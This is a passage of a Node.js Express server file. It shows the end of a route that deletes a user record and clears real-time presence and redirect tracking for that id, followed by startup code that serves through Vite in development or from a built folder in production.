    .eq('id', id);

  if (error) {
    return res.status(500).json({ error: error.message });
  }

  userPresence.delete(id);
  lastKnownUserPage.delete(id);
  userMetaMap.delete(id);
  pendingRedirects.delete(id);
  explicitlyOfflineIds.set(id, Date.now());
  for (const [cid, entry] of devicePresence.entries()) {
    if (entry.requestId === id) {
      devicePresence.delete(cid);
    }
  }

  broadcastToAdmins();
  return res.json({ ok: true, id });
});

// ==================== SERVER STARTUP ====================
async function startServer() {
  const isProd = process.env.NODE_ENV === 'production';

  if (!isProd) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.resolve(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*all', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on http://0.0.0.0:${PORT}`);
  });
}

startServer();
